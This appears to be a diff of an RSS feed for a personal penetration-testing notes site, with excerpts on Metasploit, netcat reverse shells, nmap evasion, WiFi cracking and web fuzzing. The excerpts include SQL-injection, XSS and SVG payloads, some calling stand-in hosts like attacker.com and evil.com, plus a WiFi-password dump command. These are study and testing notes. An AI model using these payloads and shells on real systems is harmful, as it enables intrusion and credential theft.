 $ msfconsole ... [loaded] msf5 exploit(multi/handler) &amp;gt; use multi/handler msf5 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcp payload =&amp;gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &amp;gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &amp;#39;&amp;#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) &amp;gt; set LHOST 192.</description>
@@ -419,10 +419,10 @@ $ msfconsole ... [loaded] msf5 exploit(multi/handler) &amp;gt; use multi/handler
     
     <item>
       <title>MITM_Intercept</title>
-      <link>./notes/public/mitm_intercept/</link>
+      <link>/notes/public/mitm_intercept/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/mitm_intercept/</guid>
+      <guid>/notes/public/mitm_intercept/</guid>
       <description>Configure your MacOS to point /etc/private/hosts to real server.
 Next use the following script to print and return handlers.
 ## basic intercept tcp macos desktop via /etc/private/hosts def handle_request(message): print(message) return message + b&amp;#34;\x00&amp;#34; def handle_response(message): # Both functions must return a message. print(message) return message Run mitm_intercept.py with the following command line:
@@ -433,20 +433,20 @@ References:
     
     <item>
       <title>Modding Uplink by Introversion</title>
-      <link>./notes/public/modding-uplink-by-introversion/</link>
+      <link>/notes/public/modding-uplink-by-introversion/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/modding-uplink-by-introversion/</guid>
+      <guid>/notes/public/modding-uplink-by-introversion/</guid>
       <description>Are you a modder? Do you want to learn how to make game modes and game hacks? You are at the right place. We will take Uplink as an example and explore various things, based on recollection of the source code. The source codes is visible at this link.
 Changing the Uplink default Font Size for HDPI On MacOS, specifically when using 2K resolution or above, either via Retina or external display; the font size of Uplink interface becomes to small to read.</description>
     </item>
     
     <item>
       <title>netcat tricks</title>
-      <link>./notes/public/netcat-tricks/</link>
+      <link>/notes/public/netcat-tricks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/netcat-tricks/</guid>
+      <guid>/notes/public/netcat-tricks/</guid>
       <description>Basic use of Netcat + CentOS Firewall Rules For direct reverse shell:
 |attacker machine|&amp;lt;------&amp;gt;|victim machine| On &amp;ldquo;attackers machine&amp;rdquo; (vps, infra, blackhole), drop all iptables rules (dirty), and setup a connection listener:
 $ sudo iptables -F $ sudo ncat -nlvp 9999 On &amp;ldquo;victim machine&amp;rdquo; (target), connect to netcat listener:
@@ -457,29 +457,29 @@ For probe direct reverse shell:
     
     <item>
       <title>Network</title>
-      <link>./notes/public/network/</link>
+      <link>/notes/public/network/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/network/</guid>
+      <guid>/notes/public/network/</guid>
       <description> Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks  </description>
     </item>
     
     <item>
       <title>Network Lab</title>
-      <link>./notes/public/network-lab/</link>
+      <link>/notes/public/network-lab/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/network-lab/</guid>
+      <guid>/notes/public/network-lab/</guid>
       <description>Simple Topology In GSN3, add 2 VPCS and 2 Cisco routers. Start VPCS and enter Console mode. Append IPv4 address for the interface.
 # sets ipv4; netmask and gw for the vpc PC1&amp;gt; ip 192.168.0.10/24 192.168.0.1 Checking for duplicate address... PC1 : 192.168.0.10 255.255.255.0 gateway 192.168.0.1 # ... same for the 2nd vpc with different static ip # PC2&amp;gt; ip 192.168.0.11/24 192.168.0.1 Always save the configuration of the assets with save command:</description>
     </item>
     
     <item>
       <title>Network Recon</title>
-      <link>./notes/public/network-recon/</link>
+      <link>/notes/public/network-recon/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/network-recon/</guid>
+      <guid>/notes/public/network-recon/</guid>
       <description>External Network Engagement nmap oneliners (do-it-all) + fw evasion
 $ nmap -Pn -vvv -sC --script=firewalk -p1-65535 -D RND:10 &amp;lt;target&amp;gt; basic recon
 $ nslookup set type=NS x.x.x.x basic nmap
@@ -489,49 +489,49 @@ $ sudo masscan 80.</description>
     
     <item>
       <title>Network Reverse Engineering</title>
-      <link>./notes/public/network-reverse-engineering/</link>
+      <link>/notes/public/network-reverse-engineering/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/network-reverse-engineering/</guid>
+      <guid>/notes/public/network-reverse-engineering/</guid>
       <description>using netstat (xnu) to print only TCP entries for a specific PID:
 $ netstat -anvp tcp | awk &amp;#39;{ if ($9 == PID) print }&amp;#39; # =&amp;gt; ie. # $ netstat -anvp tcp | awk &amp;#39;{ if ($9 == 1105) print }&amp;#39; ## tcp4 0 0 192.168.0.25.52952 52.0.253.194.443 ESTABLISHED 131072 131072 1105 0 0x0102 0x00000000 ## tcp4 0 0 127.0.0.1.45112 *.* LISTEN 131072 131072 1105 0 0x0100 0x00000106 ## tcp4 0 0 127.</description>
     </item>
     
     <item>
       <title>OPCRouter Research</title>
-      <link>./notes/public/opcrouter-research/</link>
+      <link>/notes/public/opcrouter-research/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/opcrouter-research/</guid>
+      <guid>/notes/public/opcrouter-research/</guid>
       <description>OPC-Router.com Exploitation and Vulnearbility Research Supported Platforms:
  OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126.exe**)  Windows Server 2016 &amp;amp; 2012 R2 Windows 10 (also IoT) &amp;amp; 8.1   OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126 (Windows 7).exe**)  Windows Server 2012 R1 &amp;amp; 2008 R2 Windows 8.0 &amp;amp; 7    What is OPC OLE for Process Control (OPC) is a set of standard interfaces based upon Microsoft&amp;rsquo;s OLE/COM technology. The application of the OPC standard interface makes possible interoperability between automation/control applications, field systems/devices etc.</description>
     </item>
     
     <item>
       <title>OSINT</title>
-      <link>./notes/public/osint/</link>
+      <link>/notes/public/osint/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/osint/</guid>
+      <guid>/notes/public/osint/</guid>
       <description>Breach Compilation (1.4BILL)  </description>
     </item>
     
     <item>
       <title>PHP Filesystem Functions</title>
-      <link>./notes/public/php-filesystem-functions/</link>
+      <link>/notes/public/php-filesystem-functions/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/php-filesystem-functions/</guid>
+      <guid>/notes/public/php-filesystem-functions/</guid>
       <description>Filesystem functions analysis as a part of PHP Source Code Analysis:
 // open filesystem handler fopen tmpfile bzopen gzopen SplFileObject-&amp;gt;__construct // write to filesystem (partially in combination with reading) chgrp chmod chown copy file_put_contents lchgrp lchown link mkdir move_uploaded_file rename rmdir symlink tempnam touch unlink imagepng - 2nd parameter is a path. imagewbmp - 2nd parameter is a path. image2wbmp - 2nd parameter is a path. imagejpeg - 2nd parameter is a path.</description>
     </item>
     
     <item>
       <title>PHP Source Code Analysis</title>
-      <link>./notes/public/php-source-code-analysis/</link>
+      <link>/notes/public/php-source-code-analysis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/php-source-code-analysis/</guid>
+      <guid>/notes/public/php-source-code-analysis/</guid>
       <description>When looking at PHP applications and source code analysis process, one of the first things I grep and search for are for functions accepting $USER input with the potential to execute an external program or malform the input in some form or action:
 Use this grep command
 $ grep -nR &amp;#34;exec(&amp;#34; ./phpBB/ --include \*.*php* | more` Important Function
@@ -540,10 +540,10 @@ assert() create_function() eval() exec() Execution Operators (``) include() incl
     
     <item>
       <title>Pure Reverse Engineering</title>
-      <link>./notes/public/pure-reverse-engineering/</link>
+      <link>/notes/public/pure-reverse-engineering/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/pure-reverse-engineering/</guid>
+      <guid>/notes/public/pure-reverse-engineering/</guid>
       <description>Some internal knowledge have been shared here. Otherwise, check references below.
 Use Byteman to instrument compiled Java application and Jar based files. A sample script has been included in the notes.
 Hopper Disassembler In case Hopper Disas is &amp;ldquo;Not Responding&amp;rdquo; due to large binary loaded you can:
@@ -552,28 +552,28 @@ Hopper Disassembler In case Hopper Disas is &amp;ldquo;Not Responding&amp;rdquo;
     
     <item>
       <title>RE</title>
-      <link>./notes/public/re/</link>
+      <link>/notes/public/re/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/re/</guid>
+      <guid>/notes/public/re/</guid>
       <description> Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida &amp;amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida &amp;amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research [wip]  </description>
     </item>
     
     <item>
       <title>Reverse Engineering Tricks and Tips</title>
-      <link>./notes/public/reverse-engineering-tricks-and-tips/</link>
+      <link>/notes/public/reverse-engineering-tricks-and-tips/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/reverse-engineering-tricks-and-tips/</guid>
+      <guid>/notes/public/reverse-engineering-tricks-and-tips/</guid>
       <description>Find threads by patching a jump with a short jump (EB FE) to create an endless loop you can then search for Looking for &amp;ldquo;CO A8&amp;rdquo; to find local IP addr prefix (192.168) Looking for 4-byte Unix timestamps in hex in a file format or a network packet Search/google all application constant values, classes and libraries Resize Hex Editor window to identify unknown structures and its sizes Check application Log messages and Xref them Replace all https calls with http (instead of hooking on each TLS thread and decrypting SSL) Using LD_PRELOAD to disable specific functions or patching binaries on the fly Use Burp + mitm_relay to proxy traffic Decompile JAR and attack via Frida, Byteman or any other dynamic instrumentation toolkit Use dotPeek to identify and process attack surface for anything .</description>
     </item>
     
     <item>
       <title>Server Anywhere</title>
-      <link>./notes/public/server-anywhere/</link>
+      <link>/notes/public/server-anywhere/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/server-anywhere/</guid>
+      <guid>/notes/public/server-anywhere/</guid>
       <description>Each of these commands will run an ad hoc http static server in your current (or specified) directory, available at http://localhost:8000. Use this power wisely.
 Discussion on reddit.
 Python 2.x $ python -m SimpleHTTPServer 8000 Python 3.x $ python -m http.server 8000 Twisted (Python) $ twistd -n web -p 8000 --path . Or:
@@ -582,10 +582,10 @@ $ python -c &amp;#39;from twisted.web.server import Site; from twisted.web.stati
     
     <item>
       <title>SQLi Payloads</title>
-      <link>./notes/public/sqli-payloads/</link>
+      <link>/notes/public/sqli-payloads/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/sqli-payloads/</guid>
+      <guid>/notes/public/sqli-payloads/</guid>
       <description>More examples might be avilable on netspi
 Classical Sleep:
 0&amp;#39;XOR(if(now()=sysdate(),sleep(15),0))XOR&amp;#39;Z =&amp;gt; 20.002 0&amp;#39;XOR(if(now()=sysdate(),sleep(6),0))XOR&amp;#39;Z =&amp;gt; 7.282 0&amp;#39;XOR(if(now()=sysdate(),sleep(0),0))XOR&amp;#39;Z =&amp;gt; 0.912 0&amp;#39;XOR(if(now()=sysdate(),sleep(15),0))XOR&amp;#39;Z =&amp;gt; 16.553 0&amp;#39;XOR(if(now()=sysdate(),sleep(3),0))XOR&amp;#39;Z =&amp;gt; 3.463 0&amp;#39;XOR(if(now()=sysdate(),sleep(0),0))XOR&amp;#39;Z =&amp;gt; 1.229 0&amp;#39;XOR(if(now()=sysdate(),sleep(6),0))XOR&amp;#39;Z =&amp;gt; 7.79 /api/tweets?city_id=(select(0)from(select(sleep(25)))v) ’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END))--+ type=sharesCountTw&amp;amp;url=http%3a%2f%2finsideok.ru%2flica&amp;amp;count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A)) SQL in useragent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&amp;#39;;WAITFOR DELAY ‘00:00:05’;-- Blind SQL Injection:
@@ -594,19 +594,19 @@ Classical Sleep:
     
     <item>
       <title>SVG Payloads</title>
-      <link>./notes/public/svg-payloads/</link>
+      <link>/notes/public/svg-payloads/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/svg-payloads/</guid>
+      <guid>/notes/public/svg-payloads/</guid>
       <description>&amp;lt;rect fill=�url(//attacker.com/malicious.svg#exploit)�&amp;gt; (@see: https://hackerone.com/reports/347139) </description>
     </item>
     
     <item>
       <title>Troubleshoot</title>
-      <link>./notes/public/troubleshoot/</link>
+      <link>/notes/public/troubleshoot/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/troubleshoot/</guid>
+      <guid>/notes/public/troubleshoot/</guid>
       <description>Hardware Fix Kappa Headphones on Apple Macbook
  Linux Fix RHEL SD Card Reader (Red Hat Enterprise Linux)
  Fix RHEL VPN forward options (see above)
@@ -618,19 +618,19 @@ Very annoying on JAMF&amp;rsquo;d and managed devices. Basically, Company provid
     
     <item>
       <title>Vehicle Graybox Security Testing</title>
-      <link>./notes/public/vehicle-graybox-security-testing/</link>
+      <link>/notes/public/vehicle-graybox-security-testing/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/vehicle-graybox-security-testing/</guid>
+      <guid>/notes/public/vehicle-graybox-security-testing/</guid>
       <description>Security Testing Methods  Brute-force CAN fuzzer for fuzzing application software Interface scanner, layered fuzzing DoS, Replay Messages, Tampering Man in the Middle Read and write into flash dump (extract keys, certificates, sensitive data)  Security Testing in Practice  Send out particular frame IDs using IG Generator Mount network-based attacks like DoS, MiTM, Tampering of Signals Access to debug ports like JTAG to extract + corrupt flash memory/firmware Flash dump - Look into sensitive data  Approach  Reconnaissance Start with market requirements Use customer-provided documents of the system, brochures, user manuals, published material and attacks and vulnerabilities of used components  Understand the Architecture  Analyze high-level architecture and interfaces to understand interaction between different components Use architecture model, system context, interface model, attack pathway, sequence diagram  Identify valued and protectable assets  Identify relevant assets, such is hardware, software, database, etc.</description>
     </item>
     
     <item>
       <title>Vehicle Hacking Environment</title>
-      <link>./notes/public/vehicle-hacking-environment/</link>
+      <link>/notes/public/vehicle-hacking-environment/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/vehicle-hacking-environment/</guid>
+      <guid>/notes/public/vehicle-hacking-environment/</guid>
       <description>Using Docker and Kali Install Docker first:
 $ brew install docker # =&amp;gt; or use docker.io Use the following script:
 # ... install required kali-docker tools # setup vehicle hacking environment $ apt-get install -y build-essential $ apt-get install -y ruby $ apt-get install -y ruby-dev $ apt-get install -y rubygems $ gem install serialport -- --use-system-libraries $ apt-get -y install bluez # (for hcitool) $ apt-get install -y net-tools Using Virtual Vehicle environments jeep has been developed to offer offensive-security solution for penetration testing on vehicle systems and similar attributes.</description>
@@ -638,10 +638,10 @@ $ brew install docker # =&amp;gt; or use docker.io Use the following script:
     
     <item>
       <title>vhost Enumeration</title>
-      <link>./notes/public/vhost-enumeration/</link>
+      <link>/notes/public/vhost-enumeration/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/vhost-enumeration/</guid>
+      <guid>/notes/public/vhost-enumeration/</guid>
       <description>vhost discovery via ffuf:
 # =&amp;gt; first, find the total char lenght when the vhost does not exists $ curl -s -H &amp;#34;Host: thisdoesntexists.target.ba&amp;#34; http://target.ba | wc -c 246 # =&amp;gt; now use ffuf + filtering options to find valid vhosts $ ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H &amp;#34;Host: FUZZ.target.ba&amp;#34; -u http://target.ba -fs 246 # -fc 404,403 vhost discovery via Ruby:
 $ git clone https://github.com/jobertabma/virtual-host-discovery.git $ cd virtual-host-discovery $ ruby scan.rb --ip=51.77.138.18 --host=target.</description>
@@ -649,19 +649,19 @@ $ git clone https://github.com/jobertabma/virtual-host-discovery.git $ cd virtua
     
     <item>
       <title>Web Application Penetration Test Checklist</title>
-      <link>./notes/public/web-application-penetration-test-checklist/</link>
+      <link>/notes/public/web-application-penetration-test-checklist/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/web-application-penetration-test-checklist/</guid>
+      <guid>/notes/public/web-application-penetration-test-checklist/</guid>
       <description>[+] Sql Injection Attack [+] Hibernate Query Language Injection [+] Direct OS Code Injection [+] XML Entity Injection [+] Broken Authentication and Session Management [+] Cross-Site Scripting (XSS) [+] Insecure Direct Object References [+] Security Misconfiguration [+] Sensitive Data Exposure [+] Missing Function Level Access Control [+] Cross-Site Request Forgery (CSRF) [+] Using Components with Known Vulnerabilities [+] Unvalidated Redirects and Forwards [+] Cross Site Scripting Attacks [+] Click Jacking Attacks [+] DNS Cache Poisoning [+] Symlinking – An Insider Attack [+] Cross Site Request Forgery Attacks [+] Remote Code Execution Attacks [+] Remote File inclusion [+] Local file inclusion [+] EverCookie [+] Denial oF Service Attack [+] Cookie Eviction [+] PHPwn [+] NAT Pinning [+] XSHM [+] MitM DNS Rebinding SSL/TLS Wildcards and [+] Quick Proxy Detection [+] Improving HTTPS Side Channel Attacks [+] Side Channel Attacks in SSL [+] Turning XSS into Clickjacking [+] Bypassing CSRF protections with ClickJacking [+] HTTP Parameter Pollution [+] URL Hijacking [+] Stroke Jacking [+] Fooling B64_Encode(Payload) on WAFs And Filters [+] MySQL Stacked Queries with SQL Injection.</description>
     </item>
     
     <item>
       <title>Web Fuzzing Technqiues</title>
-      <link>./notes/public/web-fuzzing-technqiues/</link>
+      <link>/notes/public/web-fuzzing-technqiues/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/web-fuzzing-technqiues/</guid>
+      <guid>/notes/public/web-fuzzing-technqiues/</guid>
       <description>Use SecList seed fuzz Use FuzzDB seed fuzz  Using Gobuster || FFuF Gobuster fuzzing:
 cat ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \ ~/SecLists/Discovery/Web-Content/common.txt \ /tmp/php_files_only.txt | gobuster fuzz -u \ https://www.utic.ba/FUZZ -b 404 -w - -k -t 30 ffuf fuzzing:
 cat ~/SecLists/Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt \ ~/SecLists/Discovery/Web-Content/CMS/symfony-315-demo.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/symfony.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/all.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/all-dirs.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/error.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/index.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/install.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/readme.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/root.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/setup.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/test.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/debug.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/admin.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/conf.</description>
@@ -669,33 +669,33 @@ cat ~/SecLists/Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt \ ~/SecLists/
     
     <item>
       <title>Web Penetration Testing Oneliners</title>
-      <link>./notes/public/web-penetration-testing-oneliners/</link>
+      <link>/notes/public/web-penetration-testing-oneliners/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/web-penetration-testing-oneliners/</guid>
+      <guid>/notes/public/web-penetration-testing-oneliners/</guid>
       <description>Also See      Check if vhost is a live on specific DNS or subdomain:
 curl -s -H &amp;#34;Host. $SUBDOMAIN.EXAMPLE.BA&amp;#34; http://example.ba Other techniques described in vhost enumeration
 Redirect URI with a Set-Cookie in GET request:
-http://$EXAMPLE.BA/index.php?redirect_url=./notes/public/%3f%0d%0a%09set-cookie:+hello=yoyoo Rate Limit Bypass
+http://$EXAMPLE.BA/index.php?redirect_url=/notes/public/%3f%0d%0a%09set-cookie:+hello=yoyoo Rate Limit Bypass
 Headers: * X-Forwarded-Host: http://evil.com (Password reset poisoning) * X-Forwarded-For: 127.0.0.* (Rate Limit Bypass) Permutations: * Null byte techniques * Case sensitiveness Some other techniques can be used, ie.</description>
     </item>
     
     <item>
       <title>Wifi Cracking via Aircrack</title>
-      <link>./notes/public/wifi-cracking-via-aircrack/</link>
+      <link>/notes/public/wifi-cracking-via-aircrack/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/wifi-cracking-via-aircrack/</guid>
+      <guid>/notes/public/wifi-cracking-via-aircrack/</guid>
       <description>Deploy Aircrack for cracking WPA2 / WEP in 10 seconds. Written and based on MacOS host.
 # =&amp;gt; install macports ... # =&amp;gt; install aircrack-ng $ sudo port install aircrack-ng # =&amp;gt; install latest XCode, with all Command Line Tools ... # =&amp;gt; create the following symlink $ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport # =&amp;gt; identity channel to sniff $ sudo airport -s # =&amp;gt; in another terminal $ sudo airport en1 sniff [CHANNEL] # =&amp;gt; in another terminal $ aircrack-ng -1 -a 1 -b [TARGET_MAC_ADDRESS] [CAP_FILE] Note that the cap_file will be located in the /tmp/airportSniff*.</description>
     </item>
     
     <item>
       <title>WinDbg Cheatsheets</title>
-      <link>./notes/public/windbg-cheatsheets/</link>
+      <link>/notes/public/windbg-cheatsheets/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/windbg-cheatsheets/</guid>
+      <guid>/notes/public/windbg-cheatsheets/</guid>
       <description>Just personal things related to my frustration with WinDbg (:
 The symbol search path tells WinDbg where to look for symbol (PDB) files. The debugger needs symbol files to obtain information about code modules (function names, variable names, and the like).
 .sympath srv* Symbol search path is: srv* Expanded Symbol search path is: cache*;SRV To see the symbols for the Notepad.exe module, enter this command:
@@ -704,10 +704,10 @@ x notepad:! Note, if ytou don7t see any output, enter .</description>
     
     <item>
       <title>Windows Notes</title>
-      <link>./notes/public/windows-notes/</link>
+      <link>/notes/public/windows-notes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/windows-notes/</guid>
+      <guid>/notes/public/windows-notes/</guid>
       <description>When setting up Reverse Engineering workstation, use retoolkit for a start kit.
  Extract WiFi cleartextr password
 cls &amp;amp; echo. &amp;amp; for /f &amp;#34;tokens=4 delims=: &amp;#34; %a in (&amp;#39;netsh wlan show profiles ^| find &amp;#34;Profile &amp;#34;&amp;#39;) do @echo off &amp;gt; nul &amp;amp; (netsh wlan show profiles name=%a key=clear | findstr &amp;#34;SSID Cipher Content&amp;#34; | find /v &amp;#34;Number&amp;#34; &amp;amp; echo.) &amp;amp; @echo on Active Directory
@@ -716,10 +716,10 @@ Access Active Directory Domain Admin via Linux:</description>
     
     <item>
       <title>XSS Payloads</title>
-      <link>./notes/public/xss-payloads/</link>
+      <link>/notes/public/xss-payloads/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>./notes/public/xss-payloads/</guid>
+      <guid>/notes/public/xss-payloads/</guid>
       <description>JSON: {&amp;#34;email&amp;#34;:&amp;#34;some@email.com&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)//&amp;#34;} The value of REQUEST_URI was not correctly sanitizing user input, in this case, double-quotes. However, due to URL encoding, this was only exploitable in IE. https://inventory.upserve.com/login/?&amp;#39;&amp;#34;--&amp;gt;&amp;lt;script&amp;gt;confirm(document.cookie)&amp;lt;/script&amp;gt; In URL PATH: &amp;#34;accesskey=&amp;#39;x&amp;#39; onclick=&amp;#39;confirm`1`&amp;#39; // Hi&amp;#39;&amp;amp;gt;&amp;#34;&amp;lt;script src=&amp;#34;//xss-server&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;x=&amp;#34;{9*9}\r\n%0a%09%0d&amp;lt;svg\onload=confirm(1)&amp;gt; </description>
     </item>
     
